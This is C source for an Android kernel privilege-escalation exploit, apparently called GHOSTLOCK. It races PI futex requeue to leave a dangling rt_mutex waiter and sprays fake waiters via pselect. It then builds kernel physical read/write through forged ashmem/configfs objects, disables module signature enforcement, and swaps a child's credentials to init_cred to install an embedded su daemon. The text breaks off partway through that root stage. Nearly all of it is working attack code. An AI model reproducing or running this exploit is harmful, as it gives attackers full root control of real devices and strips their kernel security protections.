#include "common.h"

#ifndef SYS_finit_module
#define SYS_finit_module 313
#endif
#include <sys/mount.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <stddef.h>
#include <ftw.h>

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
/* set when FUTEX_CMP_REQUEUE_PI did not establish the requeue. Without it the
 * pselect fake-lock route has nothing to operate on and only corrupts the
 * kernel, so the waiter must skip it and let the run end cleanly. */
atomic_int route_requeue_failed;
/* Set by the requeueing thread once FUTEX_CMP_REQUEUE_PI has returned. The
 * owner uses it to release f_pi_target *after* the proxy waiter is queued:
 * the handoff (WAIT_REQUEUE_PI returning 0) is what leaves
 * waiter_task->pi_blocked_on pointing at the dead stack slot. If the owner
 * never releases, the waiter times out and rt_mutex_cleanup_proxy_lock() ->
 * remove_waiter() clears pi_blocked_on with current == waiter_task, i.e. the
 * exact cleanup that erases the dangling pointer. */
atomic_int route_requeue_done;
atomic_int route_handoff_ok;
int memfd_leak;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  /* RT_MUTEX_FULL_CHAINWALK is enforced for futexes (rt_mutex_start_proxy_lock
   * passes chwalk=1), so owning f_pi_chain here while the owner blocks on it
   * turns the requeue into a detectable cycle: A -> pi_target(B) -> pi_chain(A),
   * which makes FUTEX_CMP_REQUEUE_PI fail with EDEADLK. The chain is therefore
   * off by default and only enabled with GHOSTLOCK_PI_CHAIN=1. */
  /* The original PD2055 exploit has the waiter hold a chain PI lock, which
   * makes FUTEX_CMP_REQUEUE_PI fail with EDEADLK (the expected outcome: the
   * trigger logs it and spawns the next stage). Chain is ON by default now;
   * set GHOSTLOCK_PI_CHAIN=0 to get the clean handoff instead. */
  const char *chain_env = getenv("GHOSTLOCK_PI_CHAIN");
  int no_chain = chain_env && !strcmp(chain_env, "0");

  if (!no_chain &&
      futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  /* Original PD2055 exploit waits with an absolute now+200ms deadline; the
   * requeue is issued ~100ms later, so the EDEADLK rollback happens while the
   * waiter is blocked and the waiter is out of the syscall ~100ms after it. */
  int wait_ms = ROUTE_WAIT_MS;
  const char *wait_env = getenv("GHOSTLOCK_ROUTE_WAIT_MS");
  if (wait_env && atoi(wait_env) > 0) {
    wait_ms = atoi(wait_env);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += wait_ms / 1000;
  timeout.tv_nsec += (long)(wait_ms % 1000) * 1000000L;
  if (timeout.tv_nsec >= 1000000000L) {
    timeout.tv_sec++;
    timeout.tv_nsec -= 1000000000L;
  }

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wr = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  /* rt_mutex_wait_proxy_lock() returns 0 only when the mutex was handed over
   * to us. That is the case that leaves pi_blocked_on dangling (the waker
   * dequeued the waiter, so no remove_waiter() ever runs on our behalf). A
   * timeout goes through rt_mutex_cleanup_proxy_lock() -> remove_waiter()
   * with current == waiter_task, which clears the pointer. */
  atomic_store(&route_handoff_ok, wr == 0);

  /* GHOSTLOCK_FREEZE_WAITER=1: do not make a single syscall after the futex
   * returns, so the kernel stack still holds the *real* rt_mutex_waiter the
   * rollback left in pi_blocked_on. Everything after this point (logs are
   * write(2)!) is skipped and the thread spins in user space. */
  if (getenv("GHOSTLOCK_FREEZE_WAITER")) {
    for (;;) {
      __asm__ volatile("yield" ::: "memory");
    }
  }

  pr_info("waiter: WAIT_REQUEUE_PI ret=%ld errno=%d handoff=%d\n",
          wr, wait_errno, wr == 0);

  /* The EDEADLK-then-rollback path is the one this port uses: CMP_REQUEUE_PI
   * fails with -EDEADLK, remove_waiter() clears the wrong pointer and the
   * waiter leaves the syscall with ETIMEDOUT while pi_blocked_on still points
   * at its stack frame.  Both flags below are therefore *expected* on the
   * working path; only a completely different error means the spray has no
   * dangling waiter to occupy. */
  int route_viable = (wr == 0) || (wait_errno == ETIMEDOUT);
  if (!route_viable) {
    /* No handoff -> pi_blocked_on was cleared by the timeout cleanup, so
     * there is no dangling pointer for the pselect spray to occupy. Running
     * the route anyway writes through an unrelated stack slot and can crash
     * the device. Proceed only when requeue and lock handoff both succeeded. */
    pr_error("waiter: invalid route requeue_failed=%d handoff=%d "
             "(ret=%ld errno=%d), skipping pselect route\n",
             atomic_load(&route_requeue_failed),
             atomic_load(&route_handoff_ok), wr, wait_errno);
    atomic_store(&waiter_waiting, 0);
    atomic_store(&route_done, 1);
    if (!no_chain) {
      futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
      while (!atomic_load(&owner_chain_done)) {
        usleep(1000);
      }
    }
    return NULL;
  }

  /* A route-only diagnostic: validate a normal PI-futex handoff, then release
   * the mutex from its new owner and stop before pselect or any trigger path.
   * Use with GHOSTLOCK_PI_CHAIN=0. */
  if (getenv("GHOSTLOCK_HANDOFF_ONLY")) {
    errno = 0;
    long ur = futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    pr_info("waiter: handoff-only unlock ret=%ld errno=%d\n", ur, errno);
    atomic_store(&waiter_waiting, 0);
    atomic_store(&route_done, 1);
    return NULL;
  }

  /* GHOSTLOCK_RELEASE_CHAIN=1: hand the chain lock back right after the
   * EDEADLK rollback, so the owner task (blocked on the chain) becomes
   * runnable and clears its own pi_blocked_on. Otherwise the later
   * rt_mutex_adjust_prio_chain walk runs into the A -> B(target) -> chain -> A
   * cycle that the chain lock created. */
  if (!no_chain && getenv("GHOSTLOCK_RELEASE_CHAIN")) {
    errno = 0;
    long cr = futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    pr_info("waiter: release chain ret=%ld errno=%d\n", cr, errno);
    for (int i = 0; i < 1000 && !atomic_load(&owner_chain_done); i++) {
      usleep(1000);
    }
    pr_info("waiter: chain released, owner_chain_done=%d\n",
            atomic_load(&owner_chain_done));
  }

  /* GHOSTLOCK_NO_PSELECT=1: do not touch pselect at all, so the futex stack
   * frame (and the real rt_mutex_waiter the kernel left there) stays intact.
   * This answers whether the crash comes from our fd_set spray or from the
   * stale real waiter on its own. */
  if (getenv("GHOSTLOCK_NO_PSELECT")) {
    /* Still fire the sched_setattr trigger, just without the fd_set spray.
     * Wait for the main thread's pi_state reclaim (route_requeue_done) first. */
    for (int i = 0; i < 2000 && !atomic_load(&route_requeue_done); i++) {
      usleep(1000);
    }
    pr_info("waiter: pselect skipped, firing trigger on the stale waiter\n");
    atomic_store(&main_route_delay_usec, 50000);
    atomic_store(&punch_consume_go, 1);
    sleep(3);
    atomic_store(&route_done, 1);
    return NULL;
  }
  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);

  if (!no_chain) {
    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    while (!atomic_load(&owner_chain_done)) {
      usleep(1000);
    }
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  if (getenv("GHOSTLOCK_PI_CHAIN") == NULL ||
      strcmp(getenv("GHOSTLOCK_PI_CHAIN"), "0") != 0) {
    long cr = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    pr_info("owner: LOCK_PI(chain) ret=%ld errno=%d\n", cr, errno);
  }
  atomic_store(&owner_chain_done, 1);
  /* Give the chain lock back immediately: this round does not need it any
   * more, and the next round's waiter must be able to take it. */
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

  /* GHOSTLOCK_UNLOCK_AT=<ms>: release f_pi_target this long after the requeue
   * window opens. Holding it forever means the waiter just times out, and
   * rt_mutex_cleanup_proxy_lock() -> remove_waiter() then clears
   * pi_blocked_on with current == waiter_task, destroying the very dangling
   * pointer this exploit needs. Releasing it *while the proxy waiter is
   * queued* hands the mutex over (WAIT_REQUEUE_PI returns 0) and leaves
   * pi_blocked_on pointing at the waiter's now-dead stack slot.
   *
   * Default: unlock right after the requeue syscall returns, which is the
   * earliest point where the waiter is guaranteed to be queued. */
  const char *unlock_env = getenv("GHOSTLOCK_UNLOCK_AT");
  if (unlock_env && atoi(unlock_env) > 0) {
    usleep((useconds_t)atoi(unlock_env) * 1000);
  } else if (getenv("GHOSTLOCK_PI_CHAIN") && !strcmp(getenv("GHOSTLOCK_PI_CHAIN"), "0")) {
    /* clean-handoff mode: release once the proxy waiter is queued */
    while (!atomic_load(&route_requeue_done)) {
      usleep(500);
    }
    usleep(20000);
  } else {
    /* EDEADLK mode (default, matches the original): keep holding the target
     * while the round runs (the waiter must time out, not get the lock), then
     * release it so the next round can lock it again. */
    for (int i = 0; i < 3000 && !atomic_load(&route_done); i++) {
      usleep(1000);
    }
  }
  errno = 0;
  long ur = futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  pr_info("owner: FUTEX_UNLOCK_PI(target) ret=%ld errno=%d\n", ur, errno);
  return NULL;
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  /* GHOSTLOCK_NO_TRIGGER=1: never call sched_setattr. Separates "the kernel
   * dies in the rt_mutex chain" from "the kernel dies in pselect() itself". */
  if (getenv("GHOSTLOCK_NO_TRIGGER")) {
    while (!atomic_load(&punch_consume_stop)) {
      usleep(100000);
    }
    return NULL;
  }

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) {
          break;
        }
        atomic_fetch_add(&consumer_calls, 1);
        /* __sched_setscheduler() returns early when the policy and the nice
         * value are unchanged, and rt_mutex_adjust_pi() is only reached on a
         * real change. Rotate the nice value per attempt (and skip 10, which
         * would make p->prio == FAKE_WAITER_PRIO and trip the
         * "waiter priority already correct" early exit). */
        int consumer_nice = 1 + (seq % 9);
        /* GHOSTLOCK_CONSUMER_NICE=<n>: force the nice. With the default fake
         * waiter prio (130), nice=10 makes task->prio == waiter->prio, which
         * is the rt_mutex_adjust_pi() early-exit. A surviving run therefore
         * proves the kernel really reads our fd_set waiter. */
        const char *cn = getenv("GHOSTLOCK_CONSUMER_NICE");
        if (cn && atoi(cn) > 0) {
          consumer_nice = atoi(cn);
        }
        if (calls_this_seq == 0) {
          /* Last checkpoint before the chain runs: if this line is present but
           * the "sched_setattr ... ret=" line is not, the kernel died inside
           * the sched_setattr -> rt_mutex_adjust_pi() path. */
          pr_info("consumer: triggering tid=%d nice=%d seq=%d\n",
                  tid, consumer_nice, seq);
        }
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, consumer_nice);
        int sched_errno = errno;
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
        }
        /* The first two probes per attempt bracket the chain: if the kernel
         * dies inside rt_mutex_adjust_prio_chain() the log stops here, right
         * after "pselect enter" and before this line. */
        if (calls_this_seq < 2) {
          pr_info("consumer: sched_setattr tid=%d nice=%d ret=%ld errno=%d\n",
                  tid, consumer_nice, sched_ret, sched_errno);
        }
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  atomic_store(&route_requeue_failed, 0);
  atomic_store(&route_requeue_done, 0);
  atomic_store(&route_handoff_ok, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  pr_info("route: waiter=%d owner up, issuing FUTEX_CMP_REQUEUE_PI\n",
          atomic_load(&waiter_waiting));
  usleep(100000);
  errno = 0;
  int rq = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  int rq_errno = errno;
  /* futex_requeue() returns the number of waiters it moved (>=1 on success),
   * so only a negative return means the requeue did not happen. */
  atomic_store(&route_requeue_failed, rq < 0);
  pr_info("route: CMP_REQUEUE_PI ret=%d errno=%d\n", rq, rq_errno);
  /* The rollback above kfree()d the pi_state that the waiter's stale
   * pi_blocked_on points at. Reclaim that slot with a fresh pi_state before
   * the trigger fires, otherwise rt_mutex_adjust_prio_chain walks freed
   * memory. */
  const char *pspray = getenv("GHOSTLOCK_PI_SPRAY");
  if (pspray && atoi(pspray) > 0) {
    int made = pi_state_spray(atoi(pspray));
    pr_info("route: pi_state spray slots=%d\n", made);
  }
  /* Wake the owner up so it hands the mutex over to the proxy waiter while
   * that waiter is still queued (see owner_thread). */
  atomic_store(&route_requeue_done, 1);

  if (getenv("GHOSTLOCK_FREEZE_WAITER")) {
    /* The waiter thread is spinning in user space with the stale waiter
     * intact; fire the trigger from here after a short settle. */
    usleep(30000);
    atomic_store(&main_route_delay_usec, 50000);
    atomic_store(&punch_consume_go, 1);
    pr_info("route: freeze mode, trigger armed\n");
  }

  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pr_info("route: pipe prepare requested\n");
      pipebuf_page_base = prepare_pipe_buffer_page();
      pr_info("route: pipe page ready base=%016zx\n", pipebuf_page_base);
      atomic_store(&pipe_prepare_done, 1);
    }
    usleep(10000);
  }
  pr_info("route: done (base=%016zx)\n", pipebuf_page_base);

  /* Join every thread of this round: otherwise the consumer keeps watching
   * punch_consume_go and the owner keeps holding the futexes, which makes a
   * second in-process round deadlock on the very first LOCK_PI. */
  atomic_store(&punch_consume_stop, 1);
  pthread_join(waiter, NULL);
  pthread_join(consumer, NULL);
  pthread_join(owner, NULL);
}

/* Run one pselect chain in a child process so a hung route cannot hang the
 * whole run: the parent waits up to 20 s and kills the child otherwise. */
extern void run_main_route_threads(void);
static int run_chain_isolated(void) {
  pid_t c = fork();
  if (c == 0) {
    run_main_route_threads();
    _exit(0);
  }
  for (int i = 0; i < 200; i++) {
    int st = 0;
    pid_t r = waitpid(c, &st, WNOHANG);
    if (r == c) return 0;
    usleep(100000);
  }
  kill(c, SIGKILL);
  waitpid(c, NULL, 0);
  return -1;
}

/* Run a command through /system/bin/sh (musl's system() uses /bin/sh, which is
 * not guaranteed on Android). */
static int run_shell_cmd(const char *cmd) {
  pid_t p = fork();
  if (p == 0) {
    execl("/system/bin/sh", "sh", "-c", cmd, (char *)NULL);
    _exit(127);
  }
  if (p < 0) return -1;
  int st = 0;
  while (waitpid(p, &st, 0) < 0 && errno == EINTR) {
  }
  return st;
}

/* Repair helper: recursive delete used by GHOSTLOCK_ROOT5_REPAIR. */
static int repair_unlink_cb(const char *fpath, const struct stat *sb,
                            int typeflag, struct FTW *ftwbuf) {
  (void)sb; (void)typeflag; (void)ftwbuf;
  return remove(fpath) == 0 ? 0 : -1;
}

/* ---------- configfs physrw helpers (see GHOSTLOCK_ROOT5) ---------- */
static int pr_fd = -1;
static int pr_nfd = -1;
static uintptr_t pr_asma = 0;
static ssize_t pr_read(uintptr_t addr, void *dst, size_t n);
static ssize_t pr_write(uintptr_t addr, const void *src, size_t n);
static void physrw_restore_zero_page(void);

static long g_ebit_startbit = -1;

static void physrw_build_blob(unsigned char *blob, size_t n, uintptr_t page,
                              uintptr_t bin) {
  memset(blob, 0, n);
  if (g_ebit_startbit >= 0) {
    /* fake ebitmap_node at asma+0xa0: next 0x00, maps[6] 0x08..0x37,
     * startbit 0x38 (covers 0x180 bits) */
    size_t no = 0xa0 - ASHMEM_NAME_PREFIX_LEN;
    put64(blob, no + 0x00, 0);
    for (int k = 0; k < 6; k++) put64(blob, no + 0x08 + (size_t)k * 8, ~0ULL);
    put32(blob, no + 0x38, (uint32_t)g_ebit_startbit);
  }
  put64(blob, 0x10 - ASHMEM_NAME_PREFIX_LEN, page);
  put64(blob, 0x58 - ASHMEM_NAME_PREFIX_LEN, bin);
  put32(blob, 0x60 - ASHMEM_NAME_PREFIX_LEN, 0x7ffffff0);
  size_t fo = 0x80 - ASHMEM_NAME_PREFIX_LEN;
  put64(blob, fo + 0x00, 0);
  put64(blob, fo + 0x10, text_addr(CONFIGFS_READ_ITER));
  put64(blob, fo + 0x18, text_addr(CONFIGFS_BIN_WRITE_ITER));
  put64(blob, fo + 0x78, 0);
}

/* Read back the global ZERO_PAGE through an anonymous mapping.  A dirty
 * empty_zero_page shows up here as non-zero bytes at 0x108/0x110. */
static int zero_page_user_dirty(void) {
  size_t n = 2 * PAGE_SIZE;
  unsigned char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (p == MAP_FAILED) return -1;
  volatile unsigned char a = p[0x108];
  volatile unsigned char b = p[0x110];
  munmap(p, n);
  return (a | b) ? 1 : 0;
}

/* KernelSU bring-up prerequisites: turn off module signature enforcement and
 * publish the KASLR base so the root child can run koreloc for this boot. */
static void physrw_ksu_prepare(void) {
  if (!getenv("GHOSTLOCK_KSU")) return;
  if (getenv("GHOSTLOCK_MODALLOC_DUMP")) {
    uint64_t mab = 0;
    ssize_t r1 = pr_read(text_addr(MODULE_ALLOC_BASE), &mab, sizeof mab);
    pr_info("modalloc: module_alloc_base=%016llx (r=%zd)\n",
            (unsigned long long)mab, r1);
  }
  uintptr_t se = text_addr(SIG_ENFORCE);
  unsigned char before = 0xff, after = 0xff, zero = 0;
  pr_read(se, &before, 1);
  errno = 0;
  ssize_t w = pr_write(se, &zero, 1);
  int werr = errno;
  pr_read(se, &after, 1);
  int md = -1;
  pr_read(text_addr(MODULES_DISABLED), &md, sizeof md);
  pr_info("ksu: sig_enforce %u->%u w=%zd/%d modules_disabled=%d\n", before,
          after, w, werr, md);
  int bf = open("/data/local/tmp/Kaslr.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (bf >= 0) {
    char b[40];
    int n = snprintf(b, sizeof b, "%016llx\n",
                     (unsigned long long)kaslr_base);
    ssize_t bw = write(bf, b, (size_t)n);
    (void)bw;
    close(bf);
    pr_info("ksu: base=%016llx written=%d\n", (unsigned long long)kaslr_base,
            n);
  } else {
    pr_error("ksu: cannot write Kaslr.txt errno=%d\n", errno);
  }
}

static int physrw_setup(void) {
  pin_to_core(CORE);
  if (!slide_leak_kernel_base()) {
    pr_error("physrw: slide failed\n");
    return -1;
  }
  extern uintptr_t perf_regs_asma_leak(int afd);
  extern uintptr_t perf_regs_file_write(int wfd);
  pr_fd = open(ashmem_path, O_RDWR | O_CLOEXEC | O_NONBLOCK);
  if (pr_fd < 0) {
    pr_error("physrw: ashmem errno=%d\n", errno);
    return -2;
  }
  pr_asma = perf_regs_asma_leak(pr_fd);
  if (!pr_asma) {
    pr_error("physrw: asma leak failed\n");
    return -3;
  }
  pr_nfd = open("/dev/null", O_RDWR | O_CLOEXEC);
  if (pr_nfd < 0) {
    pr_error("physrw: /dev/null errno=%d\n", errno);
    return -2;
  }
  uintptr_t file = perf_regs_file_write(pr_nfd);
  pr_info("physrw: asma=%016zx nullfd=%d file=%016zx\n", (size_t)pr_asma,
          pr_nfd, (size_t)file);
  if (!file) return -3;
  unsigned char blob[ASHMEM_NAME_LEN - ASHMEM_NAME_PREFIX_LEN];
  physrw_build_blob(blob, sizeof blob, text_addr(INIT_UTS_NS),
                    text_addr(INIT_UTS_NS));
  if (try_set_ashmem_name_blob(pr_fd, blob, sizeof blob) != 0) {
    pr_error("physrw: setname errno=%d\n", errno);
    return -4;
  }
  char nb[64];
  setenv("GHOSTLOCK_SKIP_PAGE", "1", 1);
  setenv("GHOSTLOCK_NO_PROBE", "1", 1);
  snprintf(nb, sizeof nb, "0x%zx", (size_t)(file + 0xd8));
  setenv("GHOSTLOCK_VALUEWRITE", nb, 1);
  snprintf(nb, sizeof nb, "0x%zx", (size_t)pr_asma);
  setenv("GHOSTLOCK_VALUEWRITE_PC", nb, 1);
  setenv("GHOSTLOCK_ZWRITE_SLOT", "1", 1);
  int r1 = run_chain_isolated();
  snprintf(nb, sizeof nb, "0x%zx", (size_t)(file + 0x28));
  setenv("GHOSTLOCK_VALUEWRITE", nb, 1);
  snprintf(nb, sizeof nb, "0x%zx", (size_t)(pr_asma + 0x80));
  setenv("GHOSTLOCK_VALUEWRITE_PC", nb, 1);
  setenv("GHOSTLOCK_ZWRITE_SLOT", "2", 1);
  int r2 = run_chain_isolated();
  pr_info("physrw: chains ret=%d/%d\n", r1, r2);
  if (r1 != 0 || r2 != 0) return -5;
  physrw_restore_zero_page();
  physrw_ksu_prepare();
  return 0;
}

/* Every route chain uses empty_zero_page+slot*0x100 as its fake rt_mutex
 * (owner == 0 -> the chain bails right after the detach).  The kernel enqueues
 * our fake waiter into it, i.e. writes a kernel stack pointer into
 * empty_zero_page+0x108/+0x110 (slot 1) and +0x208/+0x210 (slot 2).  That page
 * is *the* ZERO_PAGE mapped read-only into every process, so those nonzero
 * bytes make fresh anonymous memory read back garbage instead of zero - which
 * is a whole-system, delayed corruption (zygote/app_process dying at linker
 * init 1-2 minutes later is exactly this).  Once both chains are done we have
 * physrw, so put every byte of the zero page back to 0 before the root child
 * is released. */
static void physrw_restore_zero_page(void) {
  if (getenv("GHOSTLOCK_ROOT5_NORESTORE")) {
    pr_warning("physrw: zero-page restore disabled\n");
    return;
  }
  uintptr_t zp = text_addr(EMPTY_ZERO_PAGE);
  int dirty_before = zero_page_user_dirty();
  unsigned char zeros[PAGE_SIZE];
  memset(zeros, 0, sizeof zeros);
  errno = 0;
  ssize_t w = pr_write(zp, zeros, sizeof zeros);
  int werr = errno;
  int dirty_after = zero_page_user_dirty();
  unsigned char probe[32];
  memset(probe, 0xaa, sizeof probe);
  errno = 0;
  ssize_t r = pr_read(zp + 0x100, probe, sizeof probe);
  int clean = (r == (ssize_t)sizeof probe);
  for (size_t i = 0; clean && i < sizeof probe; i++) {
    if (probe[i] != 0) clean = 0;
  }
  pr_info("physrw: zero-page restore w=%zd/%d r=%zd clean=%d "
          "u_dirty=%d->%d slot=%016zx\n",
          w, werr, r, clean, dirty_before, dirty_after,
          (size_t)(zp + 0x100));
}

static int physrw_retarget(uintptr_t page, uintptr_t bin) {
  unsigned char blob[ASHMEM_NAME_LEN - ASHMEM_NAME_PREFIX_LEN];
  physrw_build_blob(blob, sizeof blob, page, bin);
  return try_set_ashmem_name_blob(pr_fd, blob, sizeof blob);
}

static ssize_t pr_read(uintptr_t addr, void *dst, size_t n) {
  if (physrw_retarget(addr, addr) != 0) return -1;
  return pread(pr_nfd, dst, n, 0);
}

static ssize_t pr_write(uintptr_t addr, const void *src, size_t n) {
  if (physrw_retarget(addr, addr) != 0) return -1;
  return pwrite(pr_nfd, src, n, 0);
}

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  if (getenv("GHOSTLOCK_TEST") &&
      !strcmp(getenv("GHOSTLOCK_TEST"), "chain")) {
    return run_sched_chain_test();
  }

  /* GHOSTLOCK_ASHMEM_PROBE=1: which ioctl command numbers does this kernel's
   * (vendor) ashmem driver actually accept?  Pure userspace probing. */
  if (getenv("GHOSTLOCK_ASHMEM_PROBE")) {
    int fd = open_ashmem_device();
    pr_info("ashmem probe: path=%s fd=%d errno=%d\n", ashmem_path, fd, errno);
    if (fd < 0) return 2;
    static const unsigned cmds[] = {
      0x7701, 0x7702, 0x7703, 0x7704, 0x7705, 0x7706, 0x7707,
      0x7708, 0x7709, 0x770a, 0x770b,
      0x40087701, 0x40087702, 0x40087703, 0x40087704,
      0x41007701, 0x41007702, 0x80047701,
    };
    char name[ASHMEM_NAME_LEN];
    memset(name, 0, sizeof name);
    strcpy(name, "GLPROBE");
    int okmask = 0;
    for (unsigned i = 0; i < sizeof(cmds) / sizeof(cmds[0]); i++) {
      memset(name, 0, sizeof name);
      strcpy(name, "GLPROBE");
      int ret = ioctl(fd, cmds[i], name);
      int err = errno;
      pr_info("ashmem probe: cmd=%#x ret=%d errno=%d buf=%02x%02x%02x%02x %02x%02x%02x%02x\n",
              cmds[i], ret, err, (unsigned char)name[0], (unsigned char)name[1],
              (unsigned char)name[2], (unsigned char)name[3], (unsigned char)name[4],
              (unsigned char)name[5], (unsigned char)name[6], (unsigned char)name[7]);
      if (ret == 0) okmask |= 1;
    }
    close(fd);
    /* Does /proc/self/fdinfo/<fd> expose the ashmem name?  If yes we get a
     * userspace read-back of kernel memory contents we just wrote. */
    int fd2 = open_ashmem_device();
    if (fd2 >= 0) {
      char nm2[ASHMEM_NAME_LEN];
      memset(nm2, 0, sizeof nm2);
      strcpy(nm2, "GLREADBACK42");
      int sr = ioctl(fd2, ASHMEM_SET_NAME, nm2);
      char p[64];
      snprintf(p, sizeof p, "/proc/self/fdinfo/%d", fd2);
      int ff = open(p, O_RDONLY | O_CLOEXEC);
      char buf[512];
      ssize_t n = ff >= 0 ? read(ff, buf, sizeof buf - 1) : -1;
      if (ff >= 0) close(ff);
      if (n > 0) {
        buf[n] = 0;
        for (ssize_t i = 0; i < n; i++) if (buf[i] == '\n') buf[i] = '|';
        pr_info("ashmem fdinfo: set=%d text=%s\n", sr, buf);
      } else {
        pr_info("ashmem fdinfo: open/read failed n=%zd errno=%d\n", n, errno);
      }
      close(fd2);
    }
    /* Also try a size ioctl on a fresh fd to see if the device is real. */
    _exit(okmask ? 0 : 1);
  }

  /* GHOSTLOCK_ROOT5=1: the physrw owner process never changes its own cred.
   * The child reports its own task_struct (perf leak) and spins in user space;
   * the parent verifies comm, points child->cred/real_cred at init_cred through
   * configfs writes, and only then lets the child run.  No syscall of the
   * writer returns with a swapped cred.  The child mounts a tmpfs at a safe
   * directory, drops the embedded su there and starts the daemon. */
  if (getenv("GHOSTLOCK_ROOT5")) {
    pin_to_core(CORE);
    if (!slide_leak_kernel_base()) { pr_error("root5: slide failed\n"); return 1; }
    extern const unsigned char embedded_su_start[];
    extern const unsigned char embedded_su_end[];
    extern uintptr_t perf_task_from_sched(void);
    struct root5_sh {
      volatile int ready;
      volatile int go;
      uintptr_t task;
      /* results reported by the child through shared memory (its file writes
       * may be denied by SELinux after the cred swap) */
      volatile int uid;
      volatile int mount_ret;
      volatile int mount_errno;
      volatile int wrote;
      volatile int daemon;
      volatile int sock;
      volatile int exec_errno;
      volatile int req;
      volatile int ack;
      volatile int stage;
      volatile int repair_ret;
      volatile int priv_ret;
      volatile int priv_errno;
      volatile int ksu_reloc;
      volatile int ksu_load_ret;
      volatile int ksu_load_errno;
      volatile int ksu_done;
      volatile int ksu_stage;
    };
    struct root5_sh *sh = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                               MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (sh == MAP_FAILED) { pr_error("root5: mmap failed\n"); return 1; }
    sh->ready = 0;
    sh->go = 0;
    sh->task = 0;
    sh->uid = -1;
    sh->mount_ret = -2;
    sh->mount_errno = 0;
    sh->wrote = -1;
    sh->daemon = -1;
    sh->sock = -1;
    sh->exec_errno = 0;
    sh->req = 0;
    sh->ack = 0;
    sh->priv_ret = 0;
    sh->priv_errno = 0;
    sh->ksu_reloc = -1;
    sh->ksu_load_ret = -1;
    sh->ksu_load_errno = 0;
    sh->ksu_done = 0;
    sh->ksu_stage = 0;
